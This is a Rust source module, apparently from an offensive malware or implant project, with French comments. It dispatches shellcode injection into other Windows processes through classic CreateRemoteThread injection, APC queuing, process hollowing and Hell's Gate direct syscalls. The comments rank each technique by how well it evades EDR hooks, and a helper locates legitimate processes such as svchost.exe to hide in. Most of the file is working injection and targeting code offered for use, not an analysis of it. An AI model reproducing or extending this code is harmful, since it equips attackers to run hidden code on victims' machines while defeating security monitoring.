// inject/mod.rs — Techniques d'injection de processus
//
// Ce module implémente plusieurs techniques d'injection :
//
//   1. Classic DLL Injection      — VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//   2. Process Hollowing          — Vider un processus légitime et y injecter le shellcode
//   3. APC Injection              — Asynchronous Procedure Call queue injection
//   4. DLL Hijacking              — Placer une DLL malveillante dans le chemin de recherche
//   5. Hell's Gate (Direct Syscalls) — Bypass total des hooks EDR userland
//
// Chaque technique a ses avantages/inconvénients en termes de détection EDR.
//
// Callstack analysis (EDR) :
//   Classic injection → CreateRemoteThread depuis ton process = IOC fort
//   APC injection     → QueueUserAPC depuis NtTestAlert = moins visible
//   Process Hollowing → Le code tourne dans un processus Microsoft signé
//   Hell's Gate      → Syscalls directs, bypass total des hooks ntdll userland

pub mod shellcode;
pub mod dll_hijack;
pub mod process_hollow;
pub mod apc;
pub mod hellsgate;

#[cfg(target_os = "windows")]
use std::os::windows::ffi::OsStringExt;
use std::ffi::OsString;

/// InjectionMethod — technique d'injection à utiliser
#[derive(Debug, Clone)]
pub enum InjectionMethod {
    /// Injection classique via CreateRemoteThread
    Classic,
    /// APC Injection — moins visible pour les EDR
    APC,
    /// Process Hollowing — shellcode dans un processus légitime
    Hollow,
    /// Hell's Gate — Direct syscalls, bypass hooks EDR ntdll
    HellsGate,
}

/// InjectionTarget — cible de l'injection
#[derive(Debug, Clone)]
pub struct InjectionTarget {
    /// PID du processus cible (0 = chercher automatiquement)
    pub pid:     u32,
    /// Nom du processus cible (ex: "svchost.exe")
    pub process: String,
    /// Méthode d'injection à utiliser
    pub method:  InjectionMethod,
}

/// inject_shellcode — point d'entrée principal du module d'injection
///
/// Sélectionne automatiquement un processus cible légitime si pid=0,
/// puis injecte le shellcode avec la méthode spécifiée.
pub fn inject_shellcode(shellcode: &[u8], target: &InjectionTarget) -> Result<u32, String> {
    match target.method {
        InjectionMethod::Classic   => shellcode::classic_inject(shellcode, target.pid),
        InjectionMethod::APC       => apc::apc_inject(shellcode, target.pid),
        InjectionMethod::Hollow    => process_hollow::hollow_inject(shellcode, &target.process),
        InjectionMethod::HellsGate => hellsgate_inject_wrapper(shellcode, target.pid),
    }
}

/// hellsgate_inject_wrapper — wrapper pour l'injection via Hell's Gate
///
/// Résout la syscall table dynamiquement puis injecte le shellcode
/// sans passer par AUCUNE fonction hookée de ntdll.dll.
fn hellsgate_inject_wrapper(shellcode: &[u8], pid: u32) -> Result<u32, String> {
    unsafe {
        let table = hellsgate::resolve_syscall_table()?;
        hellsgate::hellsgate_inject(&table, shellcode, pid)
    }
}

/// find_target_pid — trouve le PID d'un processus légitime pour l'injection
///
/// Priorité des cibles (du moins suspect au plus suspect pour l'EDR) :
///   1. svchost.exe        — service host, toujours présent, multiple instances
///   2. RuntimeBroker.exe  — présent sur Windows 10/11
///   3. explorer.exe       — toujours présent mais plus surveillé
#[cfg(target_os = "windows")]
pub fn find_target_pid(process_name: &str) -> Option<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };

        if Process32FirstW(snapshot, &mut entry) == 0 {
            windows_sys::Win32::Foundation::CloseHandle(snapshot);
            return None;
        }

        loop {
            // Convertir le nom du processus depuis UTF-16
            let name_len = entry.szExeFile
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(entry.szExeFile.len());
            let name = OsString::from_wide(&entry.szExeFile[..name_len])
                .to_string_lossy()
                .to_lowercase();

            if name == process_name.to_lowercase() {
                let pid = entry.th32ProcessID;
                windows_sys::Win32::Foundation::CloseHandle(snapshot);
                return Some(pid);
            }

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }

        windows_sys::Win32::Foundation::CloseHandle(snapshot);
        None
    }
}

#[cfg(not(target_os = "windows"))]
pub fn find_target_pid(_process_name: &str) -> Option<u32> {
    None
}
